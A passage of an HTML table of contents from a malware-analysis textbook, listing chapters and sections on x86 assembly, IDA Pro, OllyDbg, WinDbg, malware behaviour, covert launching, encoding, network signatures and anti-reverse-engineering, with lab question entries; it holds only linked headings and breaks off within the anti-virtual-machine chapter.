<li class="calibre7"><a href="index_split_001.html#p101">The x86 Architecture</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p102">Main Memory</a></li>
<li class="calibre7"><a href="index_split_001.html#p102">Instructions</a></li>
<li class="calibre7"><a href="index_split_001.html#p103">Opcodes and Endianness</a></li>
<li class="calibre7"><a href="index_split_001.html#p103">Operands</a></li>
<li class="calibre7"><a href="index_split_001.html#p104">Registers</a></li>
<li class="calibre7"><a href="index_split_001.html#p106">Simple Instructions</a></li>
<li class="calibre7"><a href="index_split_001.html#p110">The Stack</a></li>
<li class="calibre7"><a href="index_split_001.html#p113">Conditionals</a></li>
<li class="calibre7"><a href="index_split_001.html#p113">Branching</a></li>
<li class="calibre7"><a href="index_split_001.html#p114">Rep Instructions</a></li>
<li class="calibre7"><a href="index_split_001.html#p116">C Main Method and Offsets</a></li>
<li class="calibre7"><a href="index_split_001.html#p118">More Information: Intel x86 Architecture Manuals</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p118">Conclusion</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p120">5: IDA Pro</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p121">Loading an Executable</a></li>
<li class="calibre7"><a href="index_split_001.html#p122">The IDA Pro Interface</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p122">Disassembly Window Modes</a></li>
<li class="calibre7"><a href="index_split_002.html#p124">Useful Windows for Analysis</a></li>
<li class="calibre7"><a href="index_split_002.html#p125">Returning to the Default View</a></li>
<li class="calibre7"><a href="index_split_002.html#p125">Navigating IDA Pro</a></li>
<li class="calibre7"><a href="index_split_002.html#p127">Searching</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p128">Using Cross-References</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p128">Code Cross-References</a></li>
<li class="calibre7"><a href="index_split_002.html#p129">Data Cross-References</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p130">Analyzing Functions</a></li>
<li class="calibre7"><a href="index_split_002.html#p131">Using Graphing Options</a></li>
<li class="calibre7"><a href="index_split_002.html#p133">Enhancing Disassembly</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p133">Renaming Locations</a></li>
<li class="calibre7"><a href="index_split_002.html#p133">Comments</a></li>
<li class="calibre7"><a href="index_split_002.html#p133">Formatting Operands</a></li>
<li class="calibre7"><a href="index_split_002.html#p135">Using Named Constants</a></li>
<li class="calibre7"><a href="index_split_002.html#p136">Redefining Code and Data</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p136">Extending IDA with Plug-ins</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p137">Using IDC Scripts</a></li>
<li class="calibre7"><a href="index_split_002.html#p138">Using IDAPython</a></li>
<li class="calibre7"><a href="index_split_002.html#p139">Using Commercial Plug-ins</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p139">Conclusion</a></li>
<li class="calibre7"><a href="index_split_002.html#p140">Lab 5-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p140">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p142">6: Recognizing C Code Constructs in Assembly</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p143">Global vs. Local Variables</a></li>
<li class="calibre7"><a href="index_split_002.html#p145">Disassembling Arithmetic Operations</a></li>
<li class="calibre7"><a href="index_split_002.html#p146">Recognizing if Statements</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p147">Analyzing Functions Graphically with IDA Pro</a></li>
<li class="calibre7"><a href="index_split_002.html#p147">Recognizing Nested if Statements</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p149">Recognizing Loops</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p149">Finding for Loops</a></li>
<li class="calibre7"><a href="index_split_002.html#p151">Finding while Loops</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p152">Understanding Function Call Conventions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p152">cdecl</a></li>
<li class="calibre7"><a href="index_split_002.html#p153">stdcall</a></li>
<li class="calibre7"><a href="index_split_002.html#p153">fastcall</a></li>
<li class="calibre7"><a href="index_split_002.html#p153">Push vs. Move</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p154">Analyzing switch Statements</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p155">If Style</a></li>
<li class="calibre7"><a href="index_split_002.html#p156">Jump Table</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p160">Disassembling Arrays</a></li>
<li class="calibre7"><a href="index_split_002.html#p161">Identifying Structs</a></li>
<li class="calibre7"><a href="index_split_002.html#p163">Analyzing Linked List Traversal</a></li>
<li class="calibre7"><a href="index_split_002.html#p165">Conclusion</a></li>
<li class="calibre7"><a href="index_split_002.html#p166">Lab 6-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p166">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p166">Lab 6-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_002.html#p166">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_002.html#p166">Lab 6-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p167">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p167">Lab 6-4</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p167">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p168">7: Analyzing Malicious Windows Programs</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p169">The Windows API</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p169">Types and Hungarian Notation</a></li>
<li class="calibre7"><a href="index_split_003.html#p170">Handles</a></li>
<li class="calibre7"><a href="index_split_003.html#p170">File System Functions</a></li>
<li class="calibre7"><a href="index_split_003.html#p171">Special Files</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p172">The Windows Registry</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p173">Registry Root Keys</a></li>
<li class="calibre7"><a href="index_split_003.html#p173">Regedit</a></li>
<li class="calibre7"><a href="index_split_003.html#p173">Programs that Run Automatically</a></li>
<li class="calibre7"><a href="index_split_003.html#p174">Common Registry Functions</a></li>
<li class="calibre7"><a href="index_split_003.html#p174">Analyzing Registry Code in Practice</a></li>
<li class="calibre7"><a href="index_split_003.html#p175">Registry Scripting with .reg Files</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p176">Networking APIs</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p176">Berkeley Compatible Sockets</a></li>
<li class="calibre7"><a href="index_split_003.html#p177">The Server and Client Sides of Networking</a></li>
<li class="calibre7"><a href="index_split_003.html#p178">The WinINet API</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p178">Following Running Malware</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p178">DLLs</a></li>
<li class="calibre7"><a href="index_split_003.html#p180">Processes</a></li>
<li class="calibre7"><a href="index_split_003.html#p182">Threads</a></li>
<li class="calibre7"><a href="index_split_003.html#p184">Interprocess Coordination with Mutexes</a></li>
<li class="calibre7"><a href="index_split_003.html#p185">Services</a></li>
<li class="calibre7"><a href="index_split_003.html#p187">The Component Object Model</a></li>
<li class="calibre7"><a href="index_split_003.html#p190">Exceptions: When Things Go Wrong</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p191">Kernel vs. User Mode</a></li>
<li class="calibre7"><a href="index_split_003.html#p192">The Native API</a></li>
<li class="calibre7"><a href="index_split_003.html#p194">Conclusion</a></li>
<li class="calibre7"><a href="index_split_003.html#p195">Lab 7-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p195">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p195">Lab 7-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p195">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p195">Lab 7-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p196">Questions</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p198">Part 3: Advanced Dynamic Analysis</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_003.html#p200">8: Debugging</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p201">Source-Level vs. Assembly-Level Debuggers</a></li>
<li class="calibre7"><a href="index_split_003.html#p201">Kernel vs. User-Mode Debugging</a></li>
<li class="calibre7"><a href="index_split_003.html#p202">Using a Debugger</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p202">Single-Stepping</a></li>
<li class="calibre7"><a href="index_split_003.html#p203">Stepping-Over vs. Stepping-Into</a></li>
<li class="calibre7"><a href="index_split_003.html#p204">Pausing Execution with Breakpoints</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p208">Exceptions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p209">First- and Second-Chance Exceptions</a></li>
<li class="calibre7"><a href="index_split_003.html#p209">Common Exceptions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p210">Modifying Execution with a Debugger</a></li>
<li class="calibre7"><a href="index_split_003.html#p210">Modifying Program Execution in Practice</a></li>
<li class="calibre7"><a href="index_split_003.html#p211">Conclusion</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p212">9: OllyDbg</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p213">Loading Malware</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p213">Opening an Executable</a></li>
<li class="calibre7"><a href="index_split_003.html#p214">Attaching to a Running Process</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p214">The OllyDbg Interface</a></li>
<li class="calibre7"><a href="index_split_003.html#p216">Memory Map</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p217">Rebasing</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p218">Viewing Threads and Stacks</a></li>
<li class="calibre7"><a href="index_split_003.html#p219">Executing Code</a></li>
<li class="calibre7"><a href="index_split_003.html#p221">Breakpoints</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p221">Software Breakpoints</a></li>
<li class="calibre7"><a href="index_split_003.html#p222">Conditional Breakpoints</a></li>
<li class="calibre7"><a href="index_split_003.html#p223">Hardware Breakpoints</a></li>
<li class="calibre7"><a href="index_split_003.html#p223">Memory Breakpoints</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p224">Loading DLLs</a></li>
<li class="calibre7"><a href="index_split_003.html#p225">Tracing</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p225">Standard Back Trace</a></li>
<li class="calibre7"><a href="index_split_003.html#p226">Call Stack</a></li>
<li class="calibre7"><a href="index_split_003.html#p226">Run Trace</a></li>
<li class="calibre7"><a href="index_split_003.html#p226">Tracing Poison Ivy</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p227">Exception Handling</a></li>
<li class="calibre7"><a href="index_split_003.html#p228">Patching</a></li>
<li class="calibre7"><a href="index_split_003.html#p229">Analyzing Shellcode</a></li>
<li class="calibre7"><a href="index_split_003.html#p230">Assistance Features</a></li>
<li class="calibre7"><a href="index_split_003.html#p230">Plug-ins</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_003.html#p231">OllyDump</a></li>
<li class="calibre7"><a href="index_split_003.html#p231">Hide Debugger</a></li>
<li class="calibre7"><a href="index_split_003.html#p231">Command Line</a></li>
<li class="calibre7"><a href="index_split_003.html#p232">Bookmarks</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_003.html#p233">Scriptable Debugging</a></li>
<li class="calibre7"><a href="index_split_003.html#p234">Conclusion</a></li>
<li class="calibre7"><a href="index_split_004.html#p235">Lab 9-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p235">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p235">Lab 9-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p235">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p236">Lab 9-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p236">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p238">10: Kernel Debugging with WinDbg</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p239">Drivers and Kernel Code</a></li>
<li class="calibre7"><a href="index_split_004.html#p240">Setting Up Kernel Debugging</a></li>
<li class="calibre7"><a href="index_split_004.html#p243">Using WinDbg</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p243">Reading from Memory</a></li>
<li class="calibre7"><a href="index_split_004.html#p244">Using Arithmetic Operators</a></li>
<li class="calibre7"><a href="index_split_004.html#p244">Setting Breakpoints</a></li>
<li class="calibre7"><a href="index_split_004.html#p245">Listing Modules</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p245">Microsoft Symbols</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p245">Searching for Symbols</a></li>
<li class="calibre7"><a href="index_split_004.html#p246">Viewing Structure Information</a></li>
<li class="calibre7"><a href="index_split_004.html#p248">Configuring Windows Symbols</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p248">Kernel Debugging in Practice</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p248">Looking at the User-Space Code</a></li>
<li class="calibre7"><a href="index_split_004.html#p250">Looking at the Kernel-Mode Code</a></li>
<li class="calibre7"><a href="index_split_004.html#p253">Finding Driver Objects</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p254">Rootkits</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p255">Rootkit Analysis in Practice</a></li>
<li class="calibre7"><a href="index_split_004.html#p258">Interrupts</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p259">Loading Drivers</a></li>
<li class="calibre7"><a href="index_split_004.html#p259">Kernel Issues for Windows Vista, Windows 7, and x64 Versions</a></li>
<li class="calibre7"><a href="index_split_004.html#p260">Conclusion</a></li>
<li class="calibre7"><a href="index_split_004.html#p261">Lab 10-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p261">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p261">Lab 10-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p261">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p261">Lab 10-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p261">Questions</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p262">Part 4: Malware Functionality</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_004.html#p264">11: Malware Behavior</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p264">Downloaders and Launchers</a></li>
<li class="calibre7"><a href="index_split_004.html#p265">Backdoors</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p265">Reverse Shell</a></li>
<li class="calibre7"><a href="index_split_004.html#p266">RATs</a></li>
<li class="calibre7"><a href="index_split_004.html#p267">Botnets</a></li>
<li class="calibre7"><a href="index_split_004.html#p267">RATs and Botnets Compared</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p267">Credential Stealers</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p268">GINA Interception</a></li>
<li class="calibre7"><a href="index_split_004.html#p269">Hash Dumping</a></li>
<li class="calibre7"><a href="index_split_004.html#p271">Keystroke Logging</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p274">Persistence Mechanisms</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p274">The Windows Registry</a></li>
<li class="calibre7"><a href="index_split_004.html#p276">Trojanized System Binaries</a></li>
<li class="calibre7"><a href="index_split_004.html#p277">DLL Load-Order Hijacking</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p278">Privilege Escalation</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p279">Using SeDebugPrivilege</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p280">Covering Its Tracks—User-Mode Rootkits</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p281">IAT Hooking</a></li>
<li class="calibre7"><a href="index_split_004.html#p281">Inline Hooking</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p283">Conclusion</a></li>
<li class="calibre7"><a href="index_split_004.html#p284">Lab 11-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p284">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p284">Lab 11-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p284">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p284">Lab 11-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p285">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p286">12: Covert Malware Launching</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p286">Launchers</a></li>
<li class="calibre7"><a href="index_split_004.html#p287">Process Injection</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p287">DLL Injection</a></li>
<li class="calibre7"><a href="index_split_004.html#p290">Direct Injection</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p290">Process Replacement</a></li>
<li class="calibre7"><a href="index_split_004.html#p292">Hook Injection</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p293">Local and Remote Hooks</a></li>
<li class="calibre7"><a href="index_split_004.html#p293">Keyloggers Using Hooks</a></li>
<li class="calibre7"><a href="index_split_004.html#p293">Using SetWindowsHookEx</a></li>
<li class="calibre7"><a href="index_split_004.html#p294">Thread Targeting</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_004.html#p295">Detours</a></li>
<li class="calibre7"><a href="index_split_004.html#p295">APC Injection</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_004.html#p296">APC Injection from User Space</a></li>
<li class="calibre7"><a href="index_split_005.html#p297">APC Injection from Kernel Space</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p298">Conclusion</a></li>
<li class="calibre7"><a href="index_split_005.html#p299">Lab 12-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p299">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p299">Lab 12-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p299">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p299">Lab 12-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p299">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p299">Lab 12-4</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p300">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p302">13: Data Encoding</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p303">The Goal of Analyzing Encoding Algorithms</a></li>
<li class="calibre7"><a href="index_split_005.html#p303">Simple Ciphers</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p303">Caesar Cipher</a></li>
<li class="calibre7"><a href="index_split_005.html#p304">XOR</a></li>
<li class="calibre7"><a href="index_split_005.html#p309">Other Simple Encoding Schemes</a></li>
<li class="calibre7"><a href="index_split_005.html#p310">Base64</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p313">Common Cryptographic Algorithms</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p314">Recognizing Strings and Imports</a></li>
<li class="calibre7"><a href="index_split_005.html#p315">Searching for Cryptographic Constants</a></li>
<li class="calibre7"><a href="index_split_005.html#p316">Searching for High-Entropy Content</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p318">Custom Encoding</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p318">Identifying Custom Encoding</a></li>
<li class="calibre7"><a href="index_split_005.html#p321">Advantages of Custom Encoding to the Attacker</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p321">Decoding</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p321">Self-Decoding</a></li>
<li class="calibre7"><a href="index_split_005.html#p322">Manual Programming of Decoding Functions</a></li>
<li class="calibre7"><a href="index_split_005.html#p324">Using Instrumentation for Generic Decryption</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p327">Conclusion</a></li>
<li class="calibre7"><a href="index_split_005.html#p328">Lab 13-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p328">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p328">Lab 13-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p328">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p329">Lab 13-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p329">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p330">14: Malware-Focused Network Signatures</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p330">Network Countermeasures</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p331">Observing the Malware in Its Natural Habitat</a></li>
<li class="calibre7"><a href="index_split_005.html#p331">Indications of Malicious Activity</a></li>
<li class="calibre7"><a href="index_split_005.html#p332">OPSEC = Operations Security</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p333">Safely Investigate an Attacker Online</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p333">Indirection Tactics</a></li>
<li class="calibre7"><a href="index_split_005.html#p333">Getting IP Address and Domain Information</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p335">Content-Based Network Countermeasures</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p336">Intrusion Detection with Snort</a></li>
<li class="calibre7"><a href="index_split_005.html#p337">Taking a Deeper Look</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_005.html#p340">Combining Dynamic and Static Analysis Techniques</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_005.html#p341">The Danger of Overanalysis</a></li>
<li class="calibre7"><a href="index_split_005.html#p341">Hiding in Plain Sight</a></li>
<li class="calibre7"><a href="index_split_005.html#p345">Understanding Surrounding Code</a></li>
<li class="calibre7"><a href="index_split_005.html#p346">Finding the Networking Code</a></li>
<li class="calibre7"><a href="index_split_005.html#p347">Knowing the Sources of Network Content</a></li>
<li class="calibre7"><a href="index_split_005.html#p347">Hard-Coded Data vs. Ephemeral Data</a></li>
<li class="calibre7"><a href="index_split_005.html#p348">Identifying and Leveraging the Encoding Steps</a></li>
<li class="calibre7"><a href="index_split_005.html#p350">Creating a Signature</a></li>
<li class="calibre7"><a href="index_split_005.html#p351">Analyze the Parsing Routines</a></li>
<li class="calibre7"><a href="index_split_006.html#p353">Targeting Multiple Elements</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p354">Understanding the Attacker’s Perspective</a></li>
<li class="calibre7"><a href="index_split_006.html#p355">Conclusion</a></li>
<li class="calibre7"><a href="index_split_006.html#p356">Lab 14-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p356">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p356">Lab 14-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p356">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p357">Lab 14-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p357">Questions</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p358">Part 5: Anti-Reverse-Engineering</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_006.html#p360">15: Anti-Disassembly</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p361">Understanding Anti-Disassembly</a></li>
<li class="calibre7"><a href="index_split_006.html#p362">Defeating Disassembly Algorithms</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p362">Linear Disassembly</a></li>
<li class="calibre7"><a href="index_split_006.html#p364">Flow-Oriented Disassembly</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p367">Anti-Disassembly Techniques</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p367">Jump Instructions with the Same Target</a></li>
<li class="calibre7"><a href="index_split_006.html#p369">A Jump Instruction with a Constant Condition</a></li>
<li class="calibre7"><a href="index_split_006.html#p370">Impossible Disassembly</a></li>
<li class="calibre7"><a href="index_split_006.html#p373">NOP-ing Out Instructions with IDA Pro</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p373">Obscuring Flow Control</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p373">The Function Pointer Problem</a></li>
<li class="calibre7"><a href="index_split_006.html#p375">Adding Missing Code Cross-References in IDA Pro</a></li>
<li class="calibre7"><a href="index_split_006.html#p375">Return Pointer Abuse</a></li>
<li class="calibre7"><a href="index_split_006.html#p377">Misusing Structured Exception Handlers</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p380">Thwarting Stack-Frame Analysis</a></li>
<li class="calibre7"><a href="index_split_006.html#p382">Conclusion</a></li>
<li class="calibre7"><a href="index_split_006.html#p383">Lab 15-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p383">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p383">Lab 15-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p383">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p383">Lab 15-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p383">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p384">16: Anti-Debugging</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p385">Windows Debugger Detection</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p385">Using the Windows API</a></li>
<li class="calibre7"><a href="index_split_006.html#p386">Manually Checking Structures</a></li>
<li class="calibre7"><a href="index_split_006.html#p389">Checking for System Residue</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p389">Identifying Debugger Behavior</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p390">INT Scanning</a></li>
<li class="calibre7"><a href="index_split_006.html#p390">Performing Code Checksums</a></li>
<li class="calibre7"><a href="index_split_006.html#p390">Timing Checks</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p392">Interfering with Debugger Functionality</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p392">Using TLS Callbacks</a></li>
<li class="calibre7"><a href="index_split_006.html#p394">Using Exceptions</a></li>
<li class="calibre7"><a href="index_split_006.html#p395">Inserting Interrupts</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p396">Debugger Vulnerabilities</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p396">PE Header Vulnerabilities</a></li>
<li class="calibre7"><a href="index_split_006.html#p398">The OutputDebugString Vulnerability</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p398">Conclusion</a></li>
<li class="calibre7"><a href="index_split_006.html#p400">Lab 16-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p400">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p400">Lab 16-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p400">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p401">Lab 16-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p401">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p402">17: Anti-Virtual Machine Techniques</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p403">VMware Artifacts</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p405">Bypassing VMware Artifact Searching</a></li>
<li class="calibre7"><a href="index_split_006.html#p406">Checking for Memory Artifacts</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p406">Vulnerable Instructions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_006.html#p407">Using the Red Pill Anti-VM Technique</a></li>
<li class="calibre7"><a href="index_split_006.html#p408">Using the No Pill Technique</a></li>
<li class="calibre7"><a href="index_split_006.html#p408">Querying the I/O Communication Port</a></li>
